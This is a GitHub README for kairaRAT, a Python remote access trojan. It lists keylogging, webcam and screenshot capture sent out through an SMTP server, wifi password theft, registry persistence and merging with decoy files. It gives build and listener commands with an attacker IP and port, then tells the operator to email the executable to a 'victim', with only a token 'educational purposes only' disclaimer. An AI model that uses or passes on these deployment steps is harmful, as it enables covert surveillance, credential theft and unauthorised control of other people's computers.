# kairaRAT
kairaRAT is a remote access trojan tool built with python.

![kaira1](https://github.com/st4inl3s5/kairaRAT/assets/68844502/201fb3a4-f68a-4c0e-bdc8-cc04f8e376b0)

## Features

+ File/directory managing (delete, rename, create, change etc.)

+ Download files from victim's computer using SMTP server.

+ Executing command on windows command prompt.

+ Taking screenshots from victim's computer using SMTP server.

+ Taking victim's camera snapshots using SMTP server.

+ Keylogger.

+ Persistence(hides trojan to registry and copies itself.)

+ Taking wifi names and passwords.

+ Connection without disconnection.

+ Can be merged with an arbitrary file.

+ Automatic build mode.

+ Automatic update mode.

## EDUCATIONAL PURPOSES ONLY.

#### I am not responsible in bad uses of kairaRAT.

## SETUP

You need 2 OS.1)Linux OS 2)Windows OS.Linux for listening connections and managing connections.Windows for building .exe executable file.To make setup, execute the following command on both of them :

+ pip install -r requirements.txt

  ## USAGE

  1. If you want to put icon for the trojan, go to internet and find a image file.Then convert this image file to icon file(with .ico extension) and save this icon to your windows.And if you want to merge a file with trojan too, go to internet and find a merge file(this can be .docx, .png, .jpg etc.) and save to your windows.(This step is optional for social engineering.)
 
  2. If you want to download files from victim's computer, find a SMTP server on the internet and register.(This step is optional for downloading files from victim.)
 
  3. In windows, open a command prompt terminal and change the directory to the kairaRAT project directory.Build the executable file with following command :
 
  + python main.py build -ip <your_server_ip_address> -p <your_server_port> -i <icon_file(optional)> -m <file_to_merge(optional)> -n <file_name_after_build_finish(optional)>
 
  + Example : python main.py build -ip 172.28.89.113 -p 4444 -i filetoicon.ico -m hashtypes.png -n kaira.exe
 
  + Example : python main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe
 
  ![kaira2](https://github.com/st4inl3s5/kairaRAT/assets/68844502/25ed23eb-8bcc-493b-aad0-ebc45feab032)

  4. Wait for building process.When the building finished, you see a message :
 
  ![kaira3](https://github.com/st4inl3s5/kairaRAT/assets/68844502/568461f6-b98b-41a8-b494-61333ee53e51)

  5. Check the builds directory.You must see the executable file.

  ![kaira4](https://github.com/st4inl3s5/kairaRAT/assets/68844502/353e7f0e-4a00-4a20-87b0-9aae4838f184)

  6. After that, send this executable file to your victim via email etc.And wait for victim's execute the file.When executed, the merge file will be opened(if you configured to) and trojan executing in background.Copies itself and makes persistence.
 
  ![kaira5](https://github.com/st4inl3s5/kairaRAT/assets/68844502/291e24b1-8310-41db-8d40-a0dc28e37833)

  7. Then listen the connections on your linux with the following command :
 
  +  python3 main.py server -ip <your_server_ip_address> -p <your_server_port> -sh <smtp_address(optional)> -sp <smtp_port(optional)> -se <smtp_email(optional)> -spass <smtp_password(optional)>
 
  +  Example : python3 main.py server -ip 172.28.89.113 -p 4444 -sh "smtp.gmail.com" -sp 587 -se "testsmtp@gmail.com" -spass "password123"
 
  +  Example : python main.py server -ip 172.28.89.113 -p 4444
 
  8. When the connection established, a screen like this appear :

  ![kaira6](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f520e7d2-d121-4b42-a4af-cb1cf9edc6e7)

  9. Type 'help' for command list.The usage all of them is written.
 
  10. You can take camera snapshots, screenshots, victim's keylog using SMTP server.Check your email inbox to view.
 
  ![kaira7](https://github.com/st4inl3s5/kairaRAT/assets/68844502/05e6d6a1-9b7d-45d9-ad99-68e2fe0d9fcd)

  ![kaira8](https://github.com/st4inl3s5/kairaRAT/assets/68844502/eeefd26b-82df-42ca-b889-f2e80220dbca)

  ![kaira9](https://github.com/st4inl3s5/kairaRAT/assets/68844502/162305e2-a424-4b03-b625-56d0b338ac5f)

  ![kaira10](https://github.com/st4inl3s5/kairaRAT/assets/68844502/d7e8f807-f73d-475a-9812-01f1cb9bfaaf)

** You can contact me on instagram : arduinocum.py **

  [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/st4inl3s5)
